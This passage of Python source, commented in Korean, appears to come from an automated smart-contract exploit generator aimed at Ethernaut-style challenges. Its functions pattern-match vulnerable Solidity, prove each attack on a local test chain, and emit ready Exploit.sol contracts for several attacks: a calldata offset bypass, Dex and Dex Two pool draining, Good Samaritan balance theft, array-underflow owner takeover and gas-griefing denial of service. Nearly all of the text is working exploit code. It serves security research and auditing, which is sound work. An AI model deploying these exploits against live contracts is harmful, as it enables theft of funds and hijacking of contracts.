    if p0 is not None and p1 is not None and p1 == p0:
        return None
    poc = (HEADER +
        "// Strategy: HigherOrder. registerTreasury(uint8) writes calldataload(4) — the full\n"
        "// 32-byte word — so raw calldata sets treasury > 255, then claimLeadership() wins.\n"
        f"interface IT {{ function {claim}() external; }}\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        f"        (bool ok,) = t.call(abi.encodePacked(bytes4(0x{sel.hex()}), uint256({thresh+1}))); require(ok);\n"
        f"        IT(t).{claim}();\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (higher-order)","strategy":"higher-order","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"{priv} hijacked via raw-calldata over-write",
            "strategy":f"higher-order:{writer}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"uint8 파라미터를 원시 calldata 32바이트로 덮어써 임계 게이트를 통과, 특권을 탈취했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_switch(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Switch 류: 고정 오프셋(68)에서 셀렉터를 검사하는 modifier 를, 실제 호출
    데이터를 다른 오프셋에 배치하는 calldata 조작으로 우회한다. 검사에는 off 셀렉터를,
    실제 내부 호출에는 on 셀렉터를 넣어 잠긴 함수를 실행시킨다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    om = re.search(r"calldatacopy\s*\(\s*\w+\s*,\s*(\d+)\s*,\s*4\s*\)", tb)
    if not om:
        return None
    off = int(om.group(1))
    flip = None; onfn = None; offfn = None; boolvar = None
    for fn in _functions(tb):
        if fn["external"] and any(a[0] == "bytes" for a in fn["args"]) and re.search(r"address\(this\)\s*\.\s*call\s*\(", fn["body"]):
            flip = fn["name"]
        bm = re.search(r"(\w+)\s*=\s*true", fn["body"])
        if fn["external"] and bm and not fn["args"]:
            onfn = fn["name"]; boolvar = bm.group(1)
        if fn["external"] and re.search(r"\w+\s*=\s*false", fn["body"]) and not fn["args"]:
            offfn = fn["name"]
    if not (flip and onfn and offfn):
        return None
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    flipsel = Web3.keccak(text=f"{flip}(bytes)")[:4]
    onsel = Web3.keccak(text=f"{onfn}()")[:4]
    offsel = Web3.keccak(text=f"{offfn}()")[:4]
    # calldata 배치: [4]=offset(0x60) [36]=filler [68]=off셀렉터 [100]=len(4) [132]=on셀렉터
    def w(x): return x.to_bytes(32, "big")
    data = (flipsel + w(0x60) + w(0) + (offsel + b"\x00"*28) + w(4) + (onsel + b"\x00"*28))
    w3, acct = _mk_evm()
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        taddr = w3.eth.wait_for_transaction_receipt(
            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":6_000_000})).contractAddress
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    try:
        b0 = tc.functions[boolvar]().call()
        w3.eth.send_transaction({"from":acct,"to":taddr,"data":"0x"+data.hex(),"gas":300000})
        b1 = tc.functions[boolvar]().call()
    except Exception:
        return None
    if not (b0 is False and b1 is True):
        return None
    poc = (HEADER +
        "// Strategy: Switch. The onlyOff modifier checks a selector at fixed calldata\n"
        "// offset 68; we place the OFF selector there but point _data at the ON selector.\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        f"        bytes memory data = hex\"{data.hex()}\";\n"
        "        (bool ok,) = t.call(data); require(ok);\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (switch)","strategy":"switch","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"'{boolvar}' turned on via calldata-offset bypass",
            "strategy":f"switch:{flip}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"고정 오프셋(68) 셀렉터 검사를 calldata 배치로 우회해 잠긴 함수를 실행했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_dex_drain(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Dex 류: 스팟가격 = 상대풀잔액/자기풀잔액 스왑을 좌우로 반복하면 정수
    반올림으로 값이 커져 한 토큰 풀이 소진된다. setup(player) 로 시드 후 approve+swap 을
    번갈아 실행해 dex 의 한 토큰 잔액을 0 으로 만드는지로 증명한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if not (re.search(r"\btoken1\b", tb) and re.search(r"\btoken2\b", tb)
            and re.search(r"function\s+swap\s*\(", tb) and re.search(r"balanceOf", tb)):
        return None
    setup = None; swapfn = "swap"
    for fn in _functions(tb):
        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0] == "address" \
                and "transfer" in fn["body"] and fn["name"] != swapfn:
            setup = fn["name"]; break
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    if not (_has_getter(abi, "token1") and _has_getter(abi, "token2")):
        return None
    w3, acct = _mk_evm()
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        taddr = w3.eth.wait_for_transaction_receipt(
            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":acct,"gas":8_000_000})).contractAddress
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    if not setup:
        return None
    try:
        getattr(tc.functions, setup)(Web3.to_checksum_address(acct)).transact({"from":acct,"gas":2_000_000})
    except Exception:
        return None
    t1 = tc.functions.token1().call(); t2 = tc.functions.token2().call()
    erc = [{"constant":True,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
           {"inputs":[{"name":"","type":"address"},{"name":"","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]
    tok1 = w3.eth.contract(address=t1, abi=erc); tok2 = w3.eth.contract(address=t2, abi=erc)
    MAX = (1 << 256) - 1
    try:
        tok1.functions.approve(taddr, MAX).transact({"from":acct,"gas":200000})
        tok2.functions.approve(taddr, MAX).transact({"from":acct,"gas":200000})
    except Exception:
        return None
    def dbal(tok): return int(tok.functions.balanceOf(taddr).call())
    def pbal(tok): return int(tok.functions.balanceOf(acct).call())
    toks = [(t1, tok1), (t2, tok2)]
    i = 0
    for _step in range(40):
        (fa, ft) = toks[i]; (ta, tt) = toks[1 - i]
        pf = dbal(ft); pt = dbal(tt)
        if pf == 0 or pt == 0:
            break
        amt = pbal(ft)
        if amt == 0:
            break
        if amt * pt // pf >= pt:      # 다음 스왑이 to 풀을 소진할 수 있으면 정확히 맞춰 스왑
            amt = pf if pf <= pbal(ft) else pbal(ft)
        try:
            getattr(tc.functions, swapfn)(Web3.to_checksum_address(fa), Web3.to_checksum_address(ta), amt).transact({"from":acct,"gas":1_000_000})
        except Exception:
            break
        i = 1 - i
    drained = (dbal(tok1) == 0 or dbal(tok2) == 0)
    if not drained:
        return None
    poc = (HEADER +
        "// Strategy: Dex. Spot price = otherReserve/thisReserve with integer rounding;\n"
        "// swapping the full balance back and forth amplifies until one pool is drained.\n"
        "interface IDex { function token1() external view returns (address);\n"
        "    function token2() external view returns (address); function swap(address,address,uint256) external; }\n"
        "interface IERC20 { function approve(address,uint256) external returns (bool);\n"
        "    function balanceOf(address) external view returns (uint256); }\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        "        address a = IDex(t).token1(); address b = IDex(t).token2();\n"
        "        IERC20(a).approve(t, type(uint256).max); IERC20(b).approve(t, type(uint256).max);\n"
        "        address from = a; address to = b;\n"
        "        for (uint i = 0; i < 40; i++) {\n"
        "            uint pf = IERC20(from).balanceOf(t); uint pt = IERC20(to).balanceOf(t);\n"
        "            if (pf == 0 || pt == 0) break;\n"
        "            uint amt = IERC20(from).balanceOf(address(this)); if (amt == 0) break;\n"
        "            if (amt * pt / pf >= pt) amt = pf;\n"
        "            IDex(t).swap(from, to, amt); (from, to) = (to, from);\n"
        "        }\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (dex-drain)","strategy":"dex-drain","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":"dex pool drained (one token → 0)",
            "strategy":f"dex-drain:{swapfn}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"스팟가격 반올림을 좌우 반복 스왑으로 증폭해 한 토큰 풀을 소진했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_good_samaritan(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Good Samaritan 류: try/catch 로 커스텀 에러(NotEnoughBalance)를 잡으면
    전액 전송(transferRemainder)하는 구조. 수신자 콜백(notify)에서 그 에러를 소액일 때만
    던지면, 첫 소액 기부에서 전액 인출 경로가 발동해 잔액 전부를 가져온다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if not (re.search(r"\btry\b", tb) and re.search(r"\bcatch\b", tb)
            and re.search(r"NotEnoughBalance", tb) and re.search(r"transferRemainder|transfer\w*\(", tb)):
        return None
    # 진입 함수(try/catch 를 가진 external)
    entry = None
    for fn in _functions(tb):
        if fn["external"] and "try" in fn["body"] and "catch" in fn["body"] and not fn["args"]:
            entry = fn["name"]; break
    if not entry:
        return None
    # notify 콜백 이름(수신자에서 불리는 함수) — INotifyable 인터페이스에서 추출
    notify = None
    im = re.search(r"interface\s+\w+\s*\{\s*function\s+(\w+)\s*\(\s*uint", strip)
    if im: notify = im.group(1)
    if not notify:
        nm2 = re.search(r"\b(\w+)\s*\(\s*amount", tb)
        notify = nm2.group(1) if nm2 else "notify"
    _solcv, _evm = _solc_for(target_src)
    pwn_src = (HEADER +
        f"interface IGS {{ function {entry}() external returns (bool); }}\n"
        "contract Pwn {\n"
        "    error NotEnoughBalance();\n"
        f"    function attack(address gs) external {{ IGS(gs).{entry}(); }}\n"
        f"    function {notify}(uint256 amount) external {{ if (amount <= 10) revert NotEnoughBalance(); }}\n"
        "}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Pwn" not in arts:
        return None
    abi = arts[name]["abi"]
    w3, acct = _mk_evm()
    def deploy(cn, args):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"gas":9_000_000})).contractAddress
    try:
        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
        paddr = deploy("Pwn", [])
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    # coin 주소 + balances 게터로 효과 관찰
    if not _has_getter(abi, "coin"):
        return None
    coin_addr = tc.functions.coin().call()
    coin_abi = [{"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]
    coin = w3.eth.contract(address=coin_addr, abi=coin_abi)
    a0 = int(coin.functions.balances(paddr).call())
    pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
    try:
        pwn.functions.attack(Web3.to_checksum_address(taddr)).transact({"from":acct,"gas":3_000_000})
    except Exception:
        return None
    a1 = int(coin.functions.balances(paddr).call())
    if not (a1 > a0 and a1 >= 1000):   # 전액(≈10^6) 유출
        return None
    poc = (HEADER +
        "// Strategy: Good Samaritan. requestDonation() calls the wallet, which notifies the\n"
        "// recipient; reverting with the NotEnoughBalance() custom error on the small donate\n"
        "// makes the try/catch fall into transferRemainder(), sending the entire balance.\n"
        f"interface IGS {{ function {entry}() external returns (bool); }}\n"
        "contract Exploit {\n"
        "    error NotEnoughBalance();\n"
        f"    function run(address gs) external {{ IGS(gs).{entry}(); }}\n"
        f"    function {notify}(uint256 amount) external {{ if (amount <= 10) revert NotEnoughBalance(); }}\n"
        "}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (good-samaritan)","strategy":"good-samaritan","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":"entire coin balance drained via custom-error catch",
            "strategy":f"good-samaritan:{entry}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"수신자 콜백에서 NotEnoughBalance 커스텀 에러를 던져 try/catch 의 전액 인출 경로를 발동시켰습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_dex_two_drain(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Dex Two 류: swap 이 from/to 가 token1/token2 인지 확인하지 않아, 공격자가
    가짜 토큰을 dex 에 넣고 swap(fake, real) 로 진짜 토큰을 전량 인출한다. 두 진짜 풀을
    모두 0 으로 만드는지로 증명한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    swapfn = None
    for fn in _functions(tb):
        if fn["name"] == "swap" and fn["external"]:
            swapfn = fn
    if not swapfn:
        return None
    # 구분: Dex(토큰 강제 require 있음)는 제외 — DexTwo 는 그 require 가 없음
    if re.search(r"==\s*token1\b", swapfn["body"]) or re.search(r"Invalid tokens", swapfn["body"]):
        return None
    if not (re.search(r"\btoken1\b", tb) and re.search(r"\btoken2\b", tb) and "balanceOf" in tb):
        return None
    setup = None
    for fn in _functions(tb):
        if fn["external"] and len(fn["args"]) == 1 and fn["args"][0][0] == "address" \
                and "transfer" in fn["body"] and fn["name"] != "swap":
            setup = fn["name"]; break
    _solcv, _evm = _solc_for(target_src)
    fake_src = (HEADER + "contract Fake {\n"
        "    mapping(address=>uint256) public bal; mapping(address=>mapping(address=>uint256)) public allow;\n"
        "    constructor(uint256 s){ bal[msg.sender]=s; }\n"
        "    function transfer(address to,uint256 a) external returns(bool){ bal[msg.sender]-=a; bal[to]+=a; return true; }\n"
        "    function transferFrom(address f,address to,uint256 a) external returns(bool){ if(allow[f][msg.sender]!=type(uint256).max) allow[f][msg.sender]-=a; bal[f]-=a; bal[to]+=a; return true; }\n"
        "    function approve(address s,uint256 a) external returns(bool){ allow[msg.sender][s]=a; return true; }\n"
        "    function balanceOf(address w) external view returns(uint256){ return bal[w]; }\n}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Fake.sol":{"content":fake_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Fake" not in arts:
        return None
    abi = arts[name]["abi"]
    if not (_has_getter(abi, "token1") and _has_getter(abi, "token2")):
        return None
    w3, acct = _mk_evm()
    def deploy(cn, args):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"gas":8_000_000})).contractAddress
    try:
        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    if setup:
        try: getattr(tc.functions, setup)(Web3.to_checksum_address(acct)).transact({"from":acct,"gas":2_000_000})
        except Exception: return None
    t1 = tc.functions.token1().call(); t2 = tc.functions.token2().call()
    erc = arts["Fake"]["abi"]
    def bal(addr, who): return int(w3.eth.contract(address=addr, abi=erc).functions.balanceOf(who).call())
    d1 = bal(t1, taddr); d2 = bal(t2, taddr)
    if d1 == 0 or d2 == 0:
        return None
    try:
        faddr = deploy("Fake", [d1 + d2 + 10])   # 넉넉히 민팅
        fake = w3.eth.contract(address=faddr, abi=erc)
        fake.functions.transfer(taddr, d1).transact({"from":acct,"gas":200000})     # dex 에 fake d1 주입
        fake.functions.approve(taddr, (1<<256)-1).transact({"from":acct,"gas":200000})
        # swap1: fake→token1, amount = d1 (dexFake=d1) → out = d1*d1/d1 = d1  (token1 소진)
        getattr(tc.functions, "swap")(Web3.to_checksum_address(faddr), Web3.to_checksum_address(t1), d1).transact({"from":acct,"gas":1_000_000})
        df = bal(faddr, taddr)   # 이제 dex fake 잔액
        # swap2: fake→token2, amount = df → out = df*d2/df = d2 (token2 소진)
        getattr(tc.functions, "swap")(Web3.to_checksum_address(faddr), Web3.to_checksum_address(t2), df).transact({"from":acct,"gas":1_000_000})
    except Exception:
        return None
    if not (bal(t1, taddr) == 0 and bal(t2, taddr) == 0):
        return None
    poc = (HEADER +
        "// Strategy: Dex Two. swap() never checks the tokens are token1/token2, so seed the\n"
        "// dex with a worthless token and swap it for the real ones to drain both pools.\n"
        "interface IDex { function token1() external view returns(address); function token2() external view returns(address);\n"
        "    function swap(address,address,uint256) external; }\n"
        "interface IERC20 { function transfer(address,uint256) external returns(bool);\n"
        "    function approve(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); }\n"
        "contract Fake { mapping(address=>uint256) public b; mapping(address=>mapping(address=>uint256)) public al;\n"
        "    constructor(uint256 s){ b[msg.sender]=s; }\n"
        "    function transfer(address to,uint256 a) external returns(bool){ b[msg.sender]-=a; b[to]+=a; return true; }\n"
        "    function transferFrom(address f,address to,uint256 a) external returns(bool){ if(al[f][msg.sender]!=type(uint256).max) al[f][msg.sender]-=a; b[f]-=a; b[to]+=a; return true; }\n"
        "    function approve(address s,uint256 a) external returns(bool){ al[msg.sender][s]=a; return true; }\n"
        "    function balanceOf(address w) external view returns(uint256){ return b[w]; } }\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        "        address a = IDex(t).token1(); address c = IDex(t).token2();\n"
        "        uint256 d1 = IERC20(a).balanceOf(t); uint256 d2 = IERC20(c).balanceOf(t);\n"
        "        Fake f = new Fake(d1 + d2 + 10);\n"
        "        f.transfer(t, d1); f.approve(t, type(uint256).max);\n"
        "        IDex(t).swap(address(f), a, d1);\n"
        "        IDex(t).swap(address(f), c, IERC20(address(f)).balanceOf(t));\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (dex2-drain)","strategy":"dex2-drain","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":"both dex pools drained via fake token",
            "strategy":"dex2-drain:swap","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"swap 이 토큰을 검증하지 않아 가짜 토큰으로 두 진짜 풀을 모두 소진했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_array_underflow(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Alien Codex 류: 동적 배열 length 를 언더플로(length-- / length -=1)시켜
    전체 스토리지를 배열 범위로 만든 뒤, 인덱스 계산으로 slot0(owner)을 임의 기록해 탈취.
    storageLayout 로 배열 슬롯과 owner 슬롯을 얻어 인덱스를 정확히 계산한다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    if not re.search(r"\.\s*length\s*(--|-=\s*1)", tb):
        return None
    # 언더플로 함수(retract), 배열 인덱스 기록 함수(revise: arr[i]=), 게이트 개시 함수
    arr = None; retract = None; revise = None; opener = None; boolgate = None
    lm = re.search(r"(\w+)\s*\.\s*length\s*(?:--|-=\s*1)", tb)
    if lm: arr = lm.group(1)
    for fn in _functions(tb):
        b = fn["body"]
        if re.search(r"\.\s*length\s*(?:--|-=\s*1)", b) and fn["external"]:
            retract = fn["name"]
        wm = re.search(re.escape(arr or "") + r"\s*\[\s*(\w+)\s*\]\s*=", b) if arr else None
        if wm and fn["external"] and len(fn["args"]) >= 2:
            revise = fn["name"]
        bm = re.search(r"(\w+)\s*=\s*true", b)
        if bm and fn["external"] and not fn["args"]:
            opener = fn["name"]; boolgate = bm.group(1)
    if not (arr and retract and revise):
        return None
    # storageLayout 확보 (0.5.13+ 필요; _solc_for 이 ^0.5.0→0.5.17 선택)
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object","storageLayout"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}; slay = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
            if cn == name:
                slay = {e["label"]: int(e["slot"]) for e in c.get("storageLayout", {}).get("storage", [])}
    if name not in arts or arr not in slay:
        return None
    # 탈취 대상 슬롯: owner/admin (없으면 slot 0)
    target_slot = slay.get("owner", slay.get("admin", 0))
    priv = "owner" if "owner" in slay else ("admin" if "admin" in slay else None)
    abi = arts[name]["abi"]
    if priv and not _has_getter(abi, priv):
        priv = None
    arr_slot = slay[arr]
    data_start = int.from_bytes(Web3.keccak(arr_slot.to_bytes(32, "big")), "big")
    index = (target_slot - data_start) % (2**256)
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts) > 1 else acct
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        taddr = w3.eth.wait_for_transaction_receipt(
            C.constructor(*[_default_for_type(t) for t in _abi_ctor_types(abi)]).transact({"from":deployer,"gas":6_000_000})).contractAddress
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    o0 = tc.functions[priv]().call() if priv else None
    try:
        if opener:
            getattr(tc.functions, opener)().transact({"from":acct,"gas":200000})
        getattr(tc.functions, retract)().transact({"from":acct,"gas":200000})
        val = bytes(12) + bytes.fromhex(acct[2:])  # bytes32(uint256(uint160(acct)))
        getattr(tc.functions, revise)(index, val).transact({"from":acct,"gas":300000})
    except Exception:
        return None
    o1 = tc.functions[priv]().call() if priv else None
    if priv and o1 is not None and o0 is not None:
        if o1 == o0 or int(o1, 16) != int(acct, 16):
            return None
    else:
        return None
    poc = (HEADER.replace(">=0.6.2", "^0.5.0") +
        "// Strategy: Alien Codex. Underflow the dynamic array length so the whole storage\n"
        "// becomes array range, then write slot 0 (owner) via a computed index.\n"
        f"interface IT {{ function {opener or 'makeContact'}() external; function {retract}() external;"
        f" function {revise}(uint256, bytes32) external; }}\n"
        "contract Exploit {\n"
        "    function run(address t) external {\n"
        + (f"        IT(t).{opener}();\n" if opener else "") +
        f"        IT(t).{retract}();\n"
        f"        uint256 idx = {index};\n"
        f"        IT(t).{revise}(idx, bytes32(uint256(uint160(msg.sender))));\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (array-underflow)","strategy":"array-underflow","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"{priv} hijacked via array-length underflow",
            "strategy":f"array-underflow:{revise}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"동적 배열 length 언더플로로 전체 스토리지를 배열로 만들고 slot0(owner)을 임의 기록해 탈취했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _synth_gas_griefing(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Denial 류: 설정 가능한 수신자에게 가스 한도 없이 .call 로 송금한 뒤
    같은 함수에서 추가 상태전이가 이어지는 구조. 공격자가 수신자로 등록되어 콜백에서
    가스를 전량 소진하면(63/64 규칙), 남은 가스로 뒤 코드가 실패해 함수 전체가 revert →
    정상 인출이 DoS 된다. 베이스라인(EOA 수신자)은 성공하지만 공격 후 revert 로 증명."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # 수신자 상태변수를 설정하는 public setter + 그 변수로 .call{value:}
    setter = None; recip = None
    for fn in _functions(tb):
        m = re.search(r"(\w+)\s*=\s*(?:_?\w+)\s*;", fn["body"])
        # setter: 파라미터를 상태변수에 대입
        if fn["external"] and fn["args"]:
            for a in fn["args"]:
                mm = re.search(r"(\w+)\s*=\s*" + re.escape(a[1]) + r"\s*;", fn["body"])
                if mm:
                    setter = fn["name"]; recip = mm.group(1); break
        if setter:
            break
    if not setter or not recip:
        return None
    # recip 로 가스무제한 .call{value:} 하고, 그 뒤 추가 코드(transfer/sstore)가 있는 함수
    drain = None
    for fn in _functions(tb):
        b = fn["body"]
        cm = re.search(re.escape(recip) + r"\s*\.\s*call\s*\{\s*value", b)
        if cm and fn["external"] and not fn["args"]:
            # .call 이후 잔여 코드가 있어야(가스 소진 시 revert 유발)
            if len(b) - cm.end() > 20:
                drain = fn["name"]; break
    if not drain:
        return None
    _solcv, _evm = _solc_for(target_src)
    pwn_src = (HEADER + "contract Pwn {\n"
               "    receive() external payable { while (true) {} }\n}\n")
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try:
        compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception:
        return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts or "Pwn" not in arts:
        return None
    abi = arts[name]["abi"]
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts)
    if len(accts) < 3:
        return None
    def deploy(cn, args, value=0, frm=None):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":frm or acct,"value":value,"gas":6_000_000})).contractAddress
    try:
        seed = 10**18 if _ctor_payable(abi) else 0
        taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)], value=seed)
    except Exception:
        return None
    if seed == 0:
        try: w3.eth.send_transaction({"from":accts[-1],"to":taddr,"value":10**18,"gas":200000})
        except Exception: pass
    tc = w3.eth.contract(address=taddr, abi=abi)
    GAS = 150000
    def _ok(txh):
        try: return int(w3.eth.wait_for_transaction_receipt(txh).status) == 1
        except Exception: return False
    tester = w3.provider.ethereum_tester; snap = tester.take_snapshot()
    # 베이스라인: 수신자를 EOA 로 두면 withdraw 성공해야 함
    try:
        getattr(tc.functions, setter)(accts[2]).transact({"from":acct,"gas":200000})
        base_ok = _ok(getattr(tc.functions, drain)().transact({"from":acct,"gas":GAS}))
    except Exception:
        base_ok = False
    tester.revert_to_snapshot(snap)
    if not base_ok:
        return None
    # 공격: 수신자를 가스 소진 컨트랙트로 → withdraw 가 revert 해야 함
    try:
        paddr = deploy("Pwn", [])
        getattr(tc.functions, setter)(paddr).transact({"from":acct,"gas":200000})
    except Exception:
        return None
    blocked = not _ok(getattr(tc.functions, drain)().transact({"from":acct,"gas":GAS}))
    if not blocked:
        return None
    poc = (HEADER +
        "// Strategy: gas-griefing DoS (Ethernaut Denial). Register an attacker as the\n"
        f"// call recipient in {setter}(); its receive() burns all forwarded gas so\n"
        f"// {drain}() runs out of gas after the call and reverts — a permanent DoS.\n"
        f"interface IT {{ function {setter}(address) external; }}\n"
        "contract Exploit {\n"
        f"    function run(address t) external payable {{ IT(t).{setter}(address(this)); }}\n"
        "    receive() external payable { while (true) {} }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (gas-griefing)","strategy":"gas-griefing","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":f"{drain}() DoS via gas griefing",
            "strategy":f"gas-griefing:{drain}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"설정 가능한 수신자에게 가스 무제한 call → 콜백에서 가스 소진 → 함수 전체 revert(DoS).",
            "ms":int((time.time()-t0)*1000)}


def _synth_shop(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Shop 류: 외부 인터페이스의 view 함수(price())를 한 함수에서 두 번 호출해
    분기·상태전이를 결정. 공격자가 타깃 자신의 상태(isSold 등)를 읽어 첫 호출은 크게,
    둘째 호출은 작게 반환하면 정직한 구현으로는 불가능한 상태(price 하락)를 만든다."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    # view uint 반환 인터페이스 메서드
    cand = []
    for im in re.finditer(r"interface\s+(\w+)\s*\{([^}]*)\}", strip):
